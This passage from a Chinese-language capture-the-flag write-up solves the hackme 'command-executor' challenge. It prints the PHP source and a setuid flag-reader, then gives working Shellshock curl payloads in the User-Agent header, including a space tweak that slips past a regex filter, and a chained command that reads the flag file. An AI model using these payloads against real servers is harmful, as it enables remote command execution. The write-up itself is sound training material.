            waf($val);
        }
    } else {
        foreach($black_list as $b) {
            if(preg_match("/$b/", $a) === 1) {
                fuck("$b detected! exit now.");
            }
        }
    }
}

waf($_SERVER);
waf($_GET);
waf($_POST);

function execute($cmd, $shell='bash') {
    system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));
}

foreach($_SERVER as $key => $val) {
    if(substr($key, 0, 5) === 'HTTP_') {
        putenv("$key=$val");
    }
}

$page = '';

if(isset($_GET['func'])) {
    $page = $_GET['func'];
    if(strstr($page, '..') !== false) {
        $page = '';
    }
}

if($page && strlen($page) > 0) {
    try {
        include("$page.php");
    } catch (Exception $e) {
    }
}

function render_default() { ?>
<p>Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.</p>

<img src="windows-run.jpg" alt="command executor">
<?php }
?><!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Command Executor</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
    <link rel="stylesheet" href="comic-neue/font.css" media="all">
    <style>
      nav { margin-bottom: 1rem; }
      img { max-width: 100%; }
    </style>
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
      <a class="navbar-brand" href="index.php">Command Executor</a>

      <ul class="navbar-nav">
<?php foreach($pages as list($file, $title)): ?>
        <li class="nav-item">
          <a class="nav-link" href="index.php?func=<?=$file?>"><?=$title?></a>
        </li>
<?php endforeach; ?>
      </ul>
    </nav>

    <div class="container"><?php if(is_callable('render')) render(); else render_default(); ?></div>
  </body>
</html>
```

还有 `cmd.php` 的源代码：

```php+HTML
<?php
function render() {
    $cmd = '';
    if(isset($_GET['cmd'])) {
        $cmd = (string)$_GET['cmd'];
    }
?>
<h1>Command Execution</h1>
<?php
    echo '<ul>';
    $cmds = ['ls', 'env'];
    foreach($cmds as $c) {
        printf('<li><a href="index.php?func=cmd&cmd=%s">%1$s</a></li>', $c);
    }
    echo '</ul>';
?>

<form action="index.php" method="GET">
  <input type="hidden" name="func" value="cmd">
  <div class="input-group">
    <input class="form-control" type="text" name="cmd" id="cmd">
    <div class="input-group-append">
      <input class="btn btn-primary" type="submit" value="Execute">
    </div>
  </div>
</form>
<script>cmd.focus();</script>
<?php

    if(strlen($cmd) > 0) {
        printf('<h2>$ %s</h2>', htmlentities($cmd));

        echo '<pre>';
        switch ($cmd) {
        case 'env':
        case 'ls':
        case 'ls -l':
        case 'ls -al':
            execute($cmd);
            break;
        case 'cat flag':
            echo '<img src="cat-flag.png" alt="cat flag">';
            break;
        default:
            printf('%s: command not found', htmlentities($cmd));
        }
        echo '</pre>';
    }
}
?>
```

注意到 `env` 会返回我们发送的 header 信息，并且可以确认这是货真价实的 `env`。那么这里能不能搞点事情出来呢？

Google 搜索 「env shell security bug」，可以找到 Shellshock 漏洞。作为一个极其严重、已经有很长时间的漏洞，在这里还会存在吗？

在 `https://blog.cloudflare.com/inside-shellshock/` 找到了一个 payload 稍作修改:

```shell
curl -H "User-Agent: () { :; }; /bin/ls" "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
```

结果：

```
\(\)\s*\{\s*:;\s*\}; detected! exit now.
```

被 `waf()` 拦下来了。但是稍微改一改就可以了。

```shell
curl -H "User-Agent: () { : ; }; /bin/ls" "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
```

返回：

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Command Executor</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
    <link rel="stylesheet" href="comic-neue/font.css" media="all">
    <style>
      nav { margin-bottom: 1rem; }
      img { max-width: 100%; }
    </style>
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
      <a class="navbar-brand" href="index.php">Command Executor</a>

      <ul class="navbar-nav">
        <li class="nav-item">
          <a class="nav-link" href="index.php?func=man">Man</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="index.php?func=untar">Tar Tester</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="index.php?func=cmd">Cmd Exec</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="index.php?func=ls">List files</a>
        </li>
      </ul>
    </nav>

    <div class="container"><h1>Command Execution</h1>
<ul><li><a href="index.php?func=cmd&cmd=ls">ls</a></li><li><a href="index.php?func=cmd&cmd=env">env</a></li></ul>
<form action="index.php" method="GET">
  <input type="hidden" name="func" value="cmd">
  <div class="input-group">
    <input class="form-control" type="text" name="cmd" id="cmd">
    <div class="input-group-append">
      <input class="btn btn-primary" type="submit" value="Execute">
    </div>
  </div>
</form>
<script>cmd.focus();</script>
<h2>$ env</h2><pre>bootstrap
cat-flag.png
cmd.php
comic-neue
index.nginx-debian.html
index.php
ls.php
man.php
untar.php
windows-run.jpg
</pre></div>
  </body>
</html>
```

成功！

通过之前 `ls.php` 的漏洞可以看到根目录下有三个与 flag 有关的文件：

```shell
-r--------   1 flag root   37 Jan  9  2018 flag
-rwsr-xr-x   1 flag root 9080 Jan 19  2018 flag-reader
-rw-r--r--   1 root root  653 Jan  9  2018 flag-reader.c
```

看一下 `flag-reader.c`。

```c
#include <unistd.h>
#include <syscall.h>
#include <fcntl.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buff[4096], rnd[16], val[16];
	if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
		write(1, "Not enough random\n", 18);
	}

	setuid(1337);
	seteuid(1337);
	alarm(1);
	write(1, &rnd, sizeof(rnd));
	read(0, &val, sizeof(val));

	if(memcmp(rnd, val, sizeof(rnd)) == 0) {
		int fd = open(argv[1], O_RDONLY);
		if(fd > 0) {
			int s = read(fd, buff, 1024);
			if(s > 0) {
				write(1, buff, s);
			}
			close(fd);
		} else {
			write(1, "Can not open file\n", 18);
		}
	} else {
		write(1, "Wrong response\n", 16);
	}
}
```

发现要在 1 秒内把其输出的内容再输入回去。

所以最终 payload 为：

```shell
curl -H "User-Agent: () { : ; }; /f*er /f*g > /tmp/fffffff_tao < /tmp/fffffff_tao" "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
```

然后

```shell
curl -H "User-Agent: () { : ; }; /bin/cat /tmp/fffffff_tao" "https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env"
```

PS: 其实有人直接在 `/var/tmp` 里面放了 flag，可以直接看 2333333。

